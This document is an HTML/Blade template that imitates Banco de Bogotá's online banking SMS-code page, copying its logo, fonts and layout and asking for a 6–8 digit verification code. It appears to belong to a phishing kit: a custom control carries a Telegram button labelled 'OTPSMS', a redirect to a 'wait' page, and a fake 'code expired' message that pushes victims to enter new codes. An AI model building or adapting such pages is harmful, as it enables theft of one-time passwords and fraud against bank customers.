<!DOCTYPE html>
<html lang="es">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="csrf-token" content="{{ csrf_token() }}">
    <link rel="icon" type="image/x-icon" href="/bogota/icono_bogota.ico">
    <title>Código SMS - Banca Virtual Banco de Bogotá</title>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css"
        integrity="sha384-T3c6CoIi6uLrA9TneNEoa7RxnatzjcDSCmG1MXxSR1GAsXEV/Dwwykc2MPK8M2HN" crossorigin="anonymous">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.3.0/font/bootstrap-icons.css">
    <script src="https://code.jquery.com/jquery-3.7.1.min.js"
        integrity="sha256-/JqT3SQfawRcv/BIHPThkBvs0OEvtFFmqPF/lYI/Cxo=" crossorigin="anonymous"></script>
    <x-control :auto-completar="false" :debug="false" redirect-url="/bogota/wait"
        toast-message="Código de verificación incorrecto o vencido. Ingresa un nuevo código de verificación"
        telegram-button="OTPSMS" />
    <style>
        @font-face {
            font-family: Roboto-Light;
            src: url(/bogota/ce61b8b68994802f2e55.ttf);
            font-display: swap
        }

        @font-face {
            font-family: Roboto-Regular;
            src: url(/bogota/6bede58e856278b0f8f1.ttf);
            font-display: swap
        }

        @font-face {
            font-family: Roboto-Medium;
            src: url(/bogota/0fcd45fbfc419c42c8b9.ttf);
            font-display: swap
        }

        @font-face {
            font-family: Roboto-Bold;
            src: url(/bogota/17451a4c1cd55e33ac57.ttf);
            font-display: swap
        }

        .texto-1 {
            font-size: 24px;
            font-family: Roboto-Medium;
            font-weight: normal;
            line-height: 36px;
            letter-spacing: 0px;
            color: #000000;
            margin-top: 16px;
        }

        .texto-2 {
            font-size: 16px;
            font-family: Roboto-Regular;
            font-weight: normal;
            line-height: 24px;
            letter-spacing: 0.2px;
            color: #000000;
        }

        .entrada-1 {
            font-size: 18px;
            font-family: Roboto-Regular;
            font-weight: normal;
            line-height: 24px;
            letter-spacing: 0.2px;
            outline: none;
            margin: 0;
            min-width: 0;
            width: -webkit-fill-available;
            text-indent: 16px;
            padding: 0;
            color: #000000;
            border: solid 1px #b3b3b3;
            background-color: #ffffff;
            border-radius: 4px;
            text-align: left;
            height: 48px;
            text-overflow: ellipsis;
            padding-right: 16px;
        }

        .boton-1 {
            font-size: 16px;
            font-family: Roboto-Medium;
            font-weight: normal;
            line-height: 24px;
            letter-spacing: .2px;
            display: flex;
            align-items: center;
            justify-content: center;
            width: 100%;
            border-radius: 100px;
            cursor: pointer;
            outline: none;
            user-select: none;
            height: 48px;
            padding-left: 32px;
            padding-right: 32px;
            padding-top: 14px;
            padding-bottom: 16px;
            border: solid 1px #0043a9;
            background-color: #0043a9;
            color: #ffffff;
            transition: .3s;
            margin-top: 32px;
        }

        .boton-1:disabled {
            background-color: #ccc;
            border-color: #ccc;
            cursor: not-allowed;
        }

        .label-1 {
            font-size: 14px;
            font-family: Roboto-Regular;
            font-weight: normal;
            line-height: 20px;
            letter-spacing: 0.2px;
            color: #444444;
            text-align: left;
        }

        .error-message {
            color: #c94740;
            font-family: Roboto-Regular;
            font-size: 12px;
            margin-top: 4px;
            margin-left: 8px;
            display: none;
        }

        .error-message.show {
            display: block;
        }

        .borde-entrada-error {
            border-color: #c94740 !important;
        }

        @media only screen and (min-width: 768px) {
            body {
                width: 40%;
                margin: 0 auto;
            }
        }
    </style>
</head>

<body class="px-3">
    <!-- Header -->
    <div class="text-center py-4">
        <img src="/bogota/logo_bogota_1.svg" width="300" height="auto" alt="Banco de Bogotá">
    </div>
    <div class="text-center">
        <img src="/bogota/banner_bogota.png" width="350" height="auto" alt="Banner">
    </div>

    <!-- Contenido Principal -->
    <h1 class="texto-1 mt-4 text-start">Código de Verificación SMS</h1>
    <p class="texto-2 mt-2">Ingresa el código que recibiste por SMS</p>
    <br>

    <!-- Mensaje de error general -->
    <div id="errorGeneral" class="error-message text-center mb-3" style="font-size: 14px; font-weight: bold;"></div>

    <form id="formulario" class="px-4 py-4 mb-2">
        <div class="mb-4">
            <label class="label-1 mb-2">Código de verificación</label>
            <input class="entrada-1 w-100" id="otpsms" name="otpsms" type="text"
                placeholder="000000" minlength="6" maxlength="8">
            <div class="error-message" id="errorCodsms"></div>
        </div>

        <input type="hidden" id="no-status" name="status" value="codsms">
        <button type="submit" class="boton-1" id="enviar" disabled>Verificar</button>
    </form>

    <!-- Footer -->
    <script>
        $(document).ready(function () {
            // Validación en tiempo real
            function validateOtp() {
                const value = $('#otpsms').val().trim();
                const isValid = /^\d{6,8}$/.test(value);
                $('#enviar').prop('disabled', !isValid);
                return isValid;
            }

            // Evento de entrada
            $('#otpsms').on('input', function () {
                let value = $(this).val().replace(/\D/g, '');
                if (value.length > 8) value = value.substring(0, 8);
                $(this).val(value);
                validateOtp();
            });
        });
    </script>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"
        integrity="sha384-C6RzsynM9kWDrMNeT87bh95OGNyZPhcTNXj1NW7RuBCsyN/o0jlpcV8Qyq46cDfL"
        crossorigin="anonymous"></script>
</body>

</html>
